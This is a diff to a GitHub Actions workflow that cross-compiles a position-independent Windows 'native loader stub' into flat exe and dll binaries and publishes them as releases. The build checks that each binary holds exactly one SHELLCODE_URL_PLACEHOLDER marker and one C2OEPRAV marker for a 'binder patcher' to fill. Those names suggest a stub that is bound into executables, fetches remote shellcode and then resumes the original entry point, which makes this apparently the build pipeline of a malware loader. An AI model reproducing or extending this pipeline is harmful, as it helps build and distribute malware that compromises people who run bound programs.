@@ -24,10 +24,36 @@ jobs:
       - name: Install mingw-w64 (x86_64)
         run: sudo apt-get update && sudo apt-get install -y gcc-mingw-w64-x86-64
 
-      - name: Build stub (freestanding, position-independent, both entry modes)
-        # build.sh is the single source of truth: compile + relocation check +
-        # link + marker-count gate. It prints the gcc version for reproducibility.
-        run: bash build.sh
+      - name: Compile stub (freestanding, position-independent, both entry modes)
+        run: |
+          # One object per entry-point mode → two distinct flat .bin files.
+          for MODE in exe dll; do
+            FLAG="BUILD_FOR_$(echo "$MODE" | tr 'a-z' 'A-Z')"
+            x86_64-w64-mingw32-gcc -c -O2 -ffreestanding -nostdlib -fno-stack-protector \
+                  -fno-asynchronous-unwind-tables -fno-unwind-tables \
+                  -D"$FLAG" -e _start stub/stub.c -o "stub-$MODE.o"
+          done
+
+      - name: Relocations (should be PC-relative only — verifies PIC)
+        run: |
+          for MODE in exe dll; do
+            echo "=== stub-$MODE.o ==="
+            x86_64-w64-mingw32-objdump -r "stub-$MODE.o" || true
+          done
+
+      - name: Link to flat PIC binary (produces stub-x64-exe.bin + stub-x64-dll.bin)
+        run: |
+          mkdir -p dist
+          for MODE in exe dll; do
+            x86_64-w64-mingw32-ld -T stub/stub.ld --entry=_start -o "stub-$MODE.pe" "stub-$MODE.o"
+            x86_64-w64-mingw32-objcopy -O binary "stub-$MODE.pe" "dist/stub-x64-$MODE.bin"
+          done
+          ls -la dist
+          # The binder patcher locates these markers in each flat binary — there must be exactly one of each.
+          for f in dist/stub-x64-exe.bin dist/stub-x64-dll.bin; do
+            test "$(grep -a -c SHELLCODE_URL_PLACEHOLDER "$f")" = "1" || { echo "FAIL ($f): URL marker missing/duplicated"; exit 1; }
+            test "$(grep -a -c C2OEPRAV "$f")" = "1" || { echo "FAIL ($f): OEP marker missing/duplicated"; exit 1; }
+          done
 
       - uses: actions/upload-artifact@v4
         with:
@@ -52,8 +78,6 @@ jobs:
             TAG="${GITHUB_REF#refs/tags/}"
             gh release create "$TAG" dist/* --title "$TAG" --notes "Native loader stub $TAG" --repo "$GITHUB_REPOSITORY"
           else
-            # Rolling preview: the delete-then-create pair briefly 404s the asset.
-            # Acceptable for a rolling pre-release channel.
             gh release delete preview --cleanup-tag --yes --repo "$GITHUB_REPOSITORY" 2>/dev/null || true
             gh release create preview dist/* --title "Preview" --prerelease --target "$GITHUB_SHA" \
               --notes "Rolling build of the native loader stub ($GITHUB_SHA)." --repo "$GITHUB_REPOSITORY"
